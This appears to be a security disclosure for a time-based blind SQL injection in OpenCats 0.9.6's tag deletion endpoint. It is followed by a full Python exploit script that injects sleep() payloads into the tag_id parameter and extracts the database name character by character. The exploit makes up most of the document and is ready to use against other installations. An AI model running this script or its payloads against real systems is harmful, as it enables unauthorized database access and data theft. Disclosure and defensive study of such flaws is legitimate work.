# SQL injection vulnerability in OpenCats 'Tag' deletion functionality.

OpenCats version 0.9.6 PHP7.2 suffers from SQL injection vulnerability. This allows attackers control over the application's database.

User has control over tagID variable, which allows SQL injection in DELETE statement via time-based/blind techniques.

PoC:
![1](https://user-images.githubusercontent.com/57464251/193554662-3ff9fd88-a6fd-46c6-be8e-d6ff32f7fb11.png)

![2](https://user-images.githubusercontent.com/57464251/193554677-ff4fbf7d-fd69-4e56-9da7-81875ae88b95.png)

![3](https://user-images.githubusercontent.com/57464251/193554689-d1aed402-e78d-4202-ab8b-f354df33cbf7.png)

![4](https://user-images.githubusercontent.com/57464251/193554697-20965e88-df36-4e9b-be18-ce92f1ed08ce.png)

![5](https://user-images.githubusercontent.com/57464251/193554702-419d861b-6a3d-4de4-b70d-81964d7cc23b.png)

tagID variable is vulnerable.
Similar query is build by application:
`DELETE FROM tag WHERE(tag_id = XXX OR tag_parent_id = 1) AND site_id = 1;`

User can control XXX part. By asking many yes/no questions to the database user can differentiate between true and false statements.
Using time-based blind technique attacker can exfiltrate data from entire database.

### PoC example: 
exfiltrate result of database() query:

https://user-images.githubusercontent.com/57464251/193555221-19bdd56f-f11c-425c-ac73-8dddaf3b9078.mp4

# xploit.py
```python
import requests
import string
import sys

def inRange(rTime, averageTime, sleepAmount):
    if(rTime > sleepAmount and rTime < rTime + (averageTime*20/100) and rTime > rTime - (averageTime*20/100)):
        return True
    else: return False

headers = {}
proxies = {}
#proxies["http"] = "http://127.0.0.1:8080"

#Login and get session cookie..
#Change this
headers["Cookie"] = "CATS=cl2201l24aihqlnch0jgnr4pd2"
url = "http://192.168.203.135/opencats/index.php?m=settings&a=ajax_tags_del"

#Prepare Content-Type for POST request compability
headers["Content-Type"] = "application/x-www-form-urlencoded"
#Prepare POST parameter 'tag_id'
postdata = "tag_id=PWN"

tempPayload = "1 OR 1=(sleep(3))"

print("Sending few request to determine average response time...")

timeSum = 0
numberOfBaselineRequests = 5
for i in range(numberOfBaselineRequests):
    try:
        rTest = requests.post(url, headers = headers, data=postdata.replace('PWN','1337'), proxies = proxies) 
        timeSum  += rTest.elapsed.total_seconds()
        if('<form name="loginForm"' in rTest.text):
            print("Session cookie not valid, change it inside .py")
            sys.exit(-1)
        print("Iteration: " + str(i+1) + ". Response time in seconds: " + str(rTest.elapsed.total_seconds()))
    except:
        print("Some exception ocurred while sending or receiving data from the application. Make sure IP is good. Exiting..")
        sys.exit(-1)

averageTime = timeSum/numberOfBaselineRequests
print("Average response time for " + str(numberOfBaselineRequests) + " requests is : " + str(averageTime))

print("\nTrying to inject sleep(3)")
r = requests.post(url, headers = headers, data = postdata.replace('PWN',tempPayload), proxies = proxies)
rTime = r.elapsed.total_seconds()
print("Response time: " + str(rTime))

if(inRange(rTime, averageTime, 3)):
    print("\n[+] Application is vulnerable to SQL injection...")

#Getting value for false statement -> sleep(1)
tempPayload2 = "1 or 1=(sleep(0.1))"
r2 = requests.post(url, headers = headers, data = postdata.replace('PWN',tempPayload2), proxies = proxies)
t_sleep_one = r2.elapsed.total_seconds()

tempPayload3 = "1 or 1=(sleep(0.3))"
r3 = requests.post(url, headers = headers, data=postdata.replace('PWN', tempPayload3), proxies = proxies)
t_sleep_three = r3.elapsed.total_seconds()

print("False statement time: " + str(t_sleep_one))
print("True statement time: " + str(t_sleep_three) + "\n")

length = 0
exfilQuery = "1 OR 1=(IF(length(database())='XXX',sleep(0.3),sleep(0.1)))"
#Determine length of the result that we want. i.e database() function..
while(True):
    q = exfilQuery.replace('XXX', str(length))
    r = requests.post(url, headers = headers, data = postdata.replace('PWN', q))
    time = r.elapsed.total_seconds()
        
    print("Length : " + str(length) + ". Time: " + str(time))

    #If sleep(3) gets executed, we have correct length
    if(time > (t_sleep_one+(t_sleep_one*20/100))):
        print("Got length " + str(length))
        break
    
    length += 1
    if(length == 1000):
        break
    
if(length == 0 or length == 1000):
    print("Something is wrong. Exiting...")
    sys.exit(-1)
else: print("Length of 'database()' query: " + str(length))

#OK----|
alphanumerics = list(string.ascii_lowercase + string.ascii_uppercase + string.digits)
exfilQuery = "1 OR 1=(IF(substr(database(),YYY,1) = 'XXX',sleep(0.3), sleep(0.1)))"

data = []
for i in range(length):
    for item in alphanumerics:
        q = exfilQuery.replace('XXX',str(item))
        q = q.replace('YYY',str(i+1))
        print(q)
        r = requests.post(url, headers = headers, data = postdata.replace('PWN',q), proxies = proxies)
        time = r.elapsed.total_seconds()
        print(str(time) + "\n")
        if(time > (t_sleep_one+(t_sleep_one*20/100))):
            print(str(i+1) + ". Letter = " + item)
            data.append(item)
            break

print("database() -> " + "".join(data))
```
